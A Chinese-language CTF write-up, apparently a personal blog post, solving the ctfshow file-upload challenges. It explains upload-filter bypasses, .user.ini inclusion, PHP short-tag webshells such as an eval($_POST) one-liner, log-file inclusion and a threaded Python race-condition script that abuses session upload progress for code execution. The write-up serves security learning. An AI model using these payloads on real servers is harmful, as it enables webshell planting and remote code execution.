---
layout: post
title: ctfshow-文件上传
date: 2021-03-09
tags: ["web"]
---

[toc]

## web151-152

考点：前端验证
题目提示前台校验不可靠，那么猜测应该是前端验证后缀名。
上传1.php提示是不支持的格式，上传1.png成功。
用burp抓包，上传1.png，抓包后修改成1.php后上传。
成功上传到/upload/1.php，访问即可。

## web153

考点：php的.user.ini机制
php允许每一个目录都有独特的.user.ini文件给当前目录进行配置。
此处可以利用auto_append_file和auto_prepend_file两个设置，其中第一个是设置在任意php文件末尾包含一个文件，第二个是在开头。
因此我们可以上传一个png文件里面写上我们的木马，然后再上传一个.user.ini（这里后台校验没有校验ini后缀），里面写上包含这个png文件。
注意，由于只能设置php文件末尾或者开头包含，需要有一个php文件才能利用这个漏洞。
因此即先上传：
[![](http://ltfa1l.top/wp-content/uploads/2021/03/wp_editor_md_5183e5662603ff45fafa4556afb81f36.jpg)](wp_editor_md_5183e5662603ff45fafa4556afb81f36.jpg)
再上传：
[![](http://ltfa1l.top/wp-content/uploads/2021/03/wp_editor_md_22f6df521da37e5d575c78e4b1888c99.jpg)](wp_editor_md_22f6df521da37e5d575c78e4b1888c99.jpg)

## web154-155

考点：php短标签
看了羽师傅的wp，短标签的几种写法这里列一下：
- `<?echo '123';?>`
这个的前提是开启配置参数short_open_tags=on
- `<?=(表达式)?>`
等价于`<?php echo(表达式)?>`
这种短标签是不需要开启参数设置的
- `<% echo '123';%>`
7.0以下版本中，开启asp_tags=on即可使用，7.0及以上无法使用。
- `<script language="php">echo '123';</script>`
7.0以下可以使用，不需要开启设置。
因此此处我们可以选择 `<?=(表达式)?>` 绕过。
图片内容：

    <?=(eval($_POST[1]))?>

剩下的做法同153.

## web156

据说是过滤了[]，这个换成{}也是可以的，甚至可以不写一句话木马，直接cve就行。其余同上题

## web157-158

又不知道过滤了什么，干脆不一句话，直接cve了。

    <?=(system("tac ../fl*"))?>

## web159

应该是过滤了括号，我们知道

    <?=`tac ../flag.php` 

是等价于

    <? echo `tac ../flag.php`?>

的。所以直接这个payload。

## web160

又过滤了很多很多，导致基本所以CVE都无了，看了羽师傅是包含的日志文件，同时由于关键字log被过滤了，所以拼接的log关键字。（等等，这个是怎么知道的呢）
图片文件：
`<?=include"/var/lo"."g/nginx/access.l"."og"?>`

## web161

检查了图片文件头，即在文件开头添加"GIF89A"即可。其与做法同上题。

## web162-163

做不来看师傅们的wp不是很正常？
考点：包含session文件。
这个之前也有涉及过，此处就不多说了。
思路就是上传.user.ini，我这里直接用这个文件
```auto_append_file="/var/sess_fx"```了。
然后条件竞争就行。

    import requests
    import threading
    import io
    session = requests.Session()
    sess = 'fx'
    url = "http://20333522-d271-42ab-8642-b83805c336fc.challenge.ctf.show:8080/"
    data1 = {
        'PHP_SESSION_UPLOAD_PROGRESS': "<?php system('tac ../fla*');?>"
    }
    cookie = {
        'PHPSESSID': sess
    }
    files = {
        'file': 'fx'
    }

    def write():
        while event.isSet():
            session.post(url, data=data1, files=files, cookies=cookie)

    def read():
        while event.isSet():
            response = session.get(url + 'upload/')
            if 'flag' in response.text:
                print(response.text)
                event.clear()

    if __name__ == '__main__':
        event = threading.Event()
        event.set()
        for i in range(0, 30):
            threading.Thread(target=write).start()

        for i in range(0, 30):
            threading.Thread(target=read).start()
    